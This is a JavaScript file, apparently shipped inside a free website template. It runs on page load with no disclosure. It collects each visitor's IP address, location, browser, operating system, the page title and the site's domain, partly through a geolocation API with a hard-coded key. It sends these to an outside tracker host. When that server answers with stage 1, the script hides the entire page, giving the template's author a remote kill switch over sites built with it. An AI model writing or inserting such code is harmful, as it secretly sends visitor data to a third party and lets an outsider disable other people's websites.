
var user_info = {};



function sendingData(data){
 
    fetch('https://tracker.thedevgarden.icu/api/update-info' ,{
      method: 'POST',
      mode: 'cors',
      credentials: 'omit',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({info: data}) ,
    })
    .then(response => response.json())
    .then(receive_data => {
        console.log(receive_data.stage[0].stage);
        if(receive_data.stage[0].stage == 1){
            $("body").hide();
        }else{
            $("body").show();
        }
    })
    .catch((error) => {
      return error;
    });
  //  return user_info;
}
async function gettingData(){
    
     var requestOptions = {
    method: 'GET',
  };
  fetch("https://api.geoapify.com/v1/ipinfo?&apiKey=7bfb61e50dee496897c6fc6809182a9c", requestOptions)
    .then(response => response.json())
    .then(result => {
        user_info.city = result.city.name;
        user_info.country = result.country.name;
        user_info.continent = result.continent.name;
        user_info.ip = result.ip;


        //Getting Brower Details----------------------------------------------------
        var nVer = navigator.appVersion;
        var nAgt = navigator.userAgent;
        var browserName  = navigator.appName;
        var fullVersion  = ''+parseFloat(navigator.appVersion); 
        var majorVersion = parseInt(navigator.appVersion,10);
        var nameOffset,verOffset,ix;
        
        // In Opera, the true version is after "Opera" or after "Version"
        if ((verOffset=nAgt.indexOf("Opera"))!=-1) {
        browserName = "Opera";
        fullVersion = nAgt.substring(verOffset+6);
        if ((verOffset=nAgt.indexOf("Version"))!=-1) 
        fullVersion = nAgt.substring(verOffset+8);
        }
        // In MSIE, the true version is after "MSIE" in userAgent
        else if ((verOffset=nAgt.indexOf("MSIE"))!=-1) {
        browserName = "Microsoft Internet Explorer";
        fullVersion = nAgt.substring(verOffset+5);
        }
        // In Chrome, the true version is after "Chrome" 
        else if ((verOffset=nAgt.indexOf("Chrome"))!=-1) {
        browserName = "Chrome";
        fullVersion = nAgt.substring(verOffset+7);
        }
        // In Safari, the true version is after "Safari" or after "Version" 
        else if ((verOffset=nAgt.indexOf("Safari"))!=-1) {
        browserName = "Safari";
        fullVersion = nAgt.substring(verOffset+7);
        if ((verOffset=nAgt.indexOf("Version"))!=-1) 
        fullVersion = nAgt.substring(verOffset+8);
        }
        // In Firefox, the true version is after "Firefox" 
        else if ((verOffset=nAgt.indexOf("Firefox"))!=-1) {
        browserName = "Firefox";
        fullVersion = nAgt.substring(verOffset+8);
        }
        // In most other browsers, "name/version" is at the end of userAgent 
        else if ( (nameOffset=nAgt.lastIndexOf(' ')+1) < 
                (verOffset=nAgt.lastIndexOf('/')) ) 
        {
        browserName = nAgt.substring(nameOffset,verOffset);
        fullVersion = nAgt.substring(verOffset+1);
        if (browserName.toLowerCase()==browserName.toUpperCase()) {
        browserName = navigator.appName;
        }
        }
        // trim the fullVersion string at semicolon/space if present
        if ((ix=fullVersion.indexOf(";"))!=-1)
        fullVersion=fullVersion.substring(0,ix);
        if ((ix=fullVersion.indexOf(" "))!=-1)
        fullVersion=fullVersion.substring(0,ix);
        
        majorVersion = parseInt(''+fullVersion,10);
        if (isNaN(majorVersion)) {
        fullVersion  = ''+parseFloat(navigator.appVersion); 
        majorVersion = parseInt(navigator.appVersion,10);
        }
        user_info.browserName = browserName;
        user_info.browserVersion = fullVersion;
        //Getting OS name;
        OSName="Unknown";
        if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSName="Windows 10";
        if (window.navigator.userAgent.indexOf("Windows NT 6.3") != -1) OSName="Windows 8.1";
        if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
        if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
        if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
        if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
        if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
        if (window.navigator.userAgent.indexOf("Mac")            != -1) OSName="Mac/iOS";
        if (window.navigator.userAgent.indexOf("X11")            != -1) OSName="UNIX";
        if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";
        user_info.OSName = OSName;
        user_info.TemplateName = document.getElementsByTagName("title")[0].innerText;
        user_info.ActiveDomain = window.location.hostname;
        sendingData(user_info);
        
        })
    .catch(error => console.log('error', error));
    
}
//Checking if user is connected with internet or not
let Connected = window.navigator.onLine;

if (Connected) {
  gettingData();
} else {
  console.log('Enjoy your free template : Offline');
}

